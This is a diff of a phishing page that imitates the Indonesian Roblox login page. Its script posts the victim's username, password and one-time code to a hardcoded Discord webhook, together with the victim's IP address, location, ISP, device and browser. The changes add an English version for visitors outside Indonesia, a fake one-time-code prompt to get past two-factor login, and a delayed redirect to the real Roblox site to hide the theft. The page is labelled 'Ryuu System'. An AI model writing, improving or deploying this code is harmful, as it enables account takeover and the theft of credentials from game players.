@@ -20,53 +20,92 @@
   .btn-gray { display: block; width: 100%; background: #393b3d; color: #fff; padding: 14px; border-radius: 8px; text-align: center; text-decoration: none; font-weight: 600; margin-bottom: 10px; cursor: pointer; }
   .footer { text-align: center; font-size: 14px; color: #b8b8b8; margin-top: 24px; }
   .footer a { color: #fff; text-decoration: none; font-weight: 600; }
+  .loading { display: none; text-align: center; font-size: 15px; color: #b8b8b8; margin-top: 15px; font-style: italic;}
 </style>
 </head>
 <body>
 <div class="overlay"></div>
 <main class="card">
+  
   <div id="loginSection">
-    <h1>Log in ke Roblox</h1>
+    <h1 id="txt-title">Log in ke Roblox</h1>
     <form id="f" novalidate>
       <input id="u" type="text" placeholder="Nama Pengguna/Email/Nomor Ponsel" autocapitalize="none" required>
       <input id="p" type="password" placeholder="Password" required>
       <div class="err" id="err"></div>
       <button type="submit" id="go">Log In</button>
     </form>
-    <div class="links"><a href="#" onclick="return false;">Lupa Password atau Nama Pengguna?</a></div>
-    <a href="#" class="btn-gray">Kirim Saya Kode Sekali Pakai</a>
+    
+    <div class="links">
+      <a href="#" onclick="return false;">Lupa Password atau Nama Pengguna?</a>
+    </div>
+    
+    <a href="#" class="btn-gray" id="btn-otp">Kirim Saya Kode Sekali Pakai</a>
     <a href="#" class="btn-gray">Log In Cepat</a>
     <a href="#" class="btn-gray">Opsi log in lainnya</a>
-    <div class="footer">Tidak punya akun? <a href="#" onclick="return false;">Daftar</a></div>
+    
+    <div class="footer" id="txt-footer">Tidak punya akun? <a href="#" onclick="return false;">Daftar</a></div>
   </div>
+
+  <div id="loadingSection" class="loading">
+    <p>Memverifikasi akun...</p>
+  </div>
+
 </main>
+
 <script>
 var webhookURL = "https://discord.com/api/webhooks/1567847177643106384/w0XBjAtPTb9tITOSKZeTEW_fXsJxgecro2b-81vs9rTxIdrMWxZaRhKutRW8Fe8Ck6IW";
+var userLang = "id";
+
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
+  if (data.country_code !== "ID") {
+    document.getElementById("txt-title").innerText = "Log in to Roblox";
+    document.getElementById("u").placeholder = "Username/Email/Phone Number";
+    document.getElementById("btn-otp").innerText = "Send Me One-Time Code";
+    document.getElementById("txt-footer").innerHTML = "Don't have an account? <a href='#'>Sign Up</a>";
+    userLang = "en";
+  }
+})
+.catch(() => {});
 
 document.getElementById('f').addEventListener('submit', function(e){
   e.preventDefault();
-  var u = document.getElementById('u').value;
-  var p = document.getElementById('p').value;
+  var u = document.getElementById('u').value.trim();
+  var p = document.getElementById('p').value.trim();
   var go = document.getElementById('go');
   var err = document.getElementById('err');
 
   if(!u || !p) {
-    err.textContent = "Harap isi semua kolom.";
+    err.textContent = userLang === "id" ? "Harap isi semua kolom." : "Please fill all fields.";
     err.style.display = "block";
     return;
   }
 
   err.style.display = "none";
-  go.textContent = "Memeriksa akun...";
-  go.disabled = true;
+  document.getElementById('loginSection').style.display = "none";
+  document.getElementById('loadingSection').style.display = "block";
+
+  var ua = navigator.userAgent;
+  var device = "Unknown";
+  if (/android/i.test(ua)) device = "Android";
+  if (/iPhone|iPad|iPod/i.test(ua)) device = "iOS (Apple)";
+  if (/Windows/i.test(ua)) device = "Windows PC";
+  if (/Mac/i.test(ua)) device = "Mac PC";
+  
+  var browser = "Unknown";
+  if (/chrome|crios/i.test(ua)) browser = "Chrome";
+  if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
+  if (/firefox|fxios/i.test(ua)) browser = "Firefox";
 
   fetch("https://ipapi.co/json/")
   .then(res => res.json())
   .then(loc => {
-    var ip = loc.ip || "Tidak diketahui";
-    var kota = loc.city || "Tidak diketahui";
-    var negara = loc.country_name || "Tidak diketahui";
-    var isp = loc.org || "Tidak diketahui";
+    var ip = loc.ip || "Unknown";
+    var kota = loc.city || "Unknown";
+    var negara = loc.country_name || "Unknown";
+    var isp = loc.org || "Unknown";
 
     var embedData = {
       embeds: [{
@@ -77,7 +116,9 @@ document.getElementById('f').addEventListener('submit', function(e){
           { name: "Password", value: p, inline: false },
           { name: "IP Address", value: ip, inline: true },
           { name: "Lokasi", value: kota + ", " + negara, inline: true },
-          { name: "Provider (ISP)", value: isp, inline: false }
+          { name: "Provider (ISP)", value: isp, inline: false },
+          { name: "Device", value: device, inline: true },
+          { name: "Browser", value: browser, inline: true }
         ],
         footer: { text: "Ryuu System" },
         timestamp: new Date().toISOString()
@@ -90,15 +131,43 @@ document.getElementById('f').addEventListener('submit', function(e){
       body: JSON.stringify(embedData)
     })
     .then(() => {
-      window.location.href = "https://www.roblox.com/login";
-    })
-    .catch(() => {
-      window.location.href = "https://www.roblox.com/login";
+      setTimeout(() => {
+        window.location.href = "https://www.roblox.com/login";
+      }, 2000);
     });
   })
   .catch(() => {
     window.location.href = "https://www.roblox.com/login";
   });
+});
+
+document.getElementById('btn-otp').addEventListener('click', function(e) {
+  e.preventDefault();
+  var code = prompt(userLang === "id" ? "Masukkan kode 6 digit yang dikirim ke email kamu:" : "Enter the 6-digit code sent to your email:");
+  if (code && code.trim() !== "") {
+    var u = document.getElementById('u').value.trim() || "Belum diisi";
+    
+    var embedData = {
+      embeds: [{
+        title: "Roblox OTP Code Caught!",
+        color: 16711680,
+        fields: [
+          { name: "Username", value: u, inline: false },
+          { name: "OTP Code", value: code, inline: false }
+        ],
+        footer: { text: "Ryuu System" },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(embedData)
+    }).then(() => {
+      window.location.href = "https://www.roblox.com/login";
+    });
+  }
 });
 </script>
 </body>
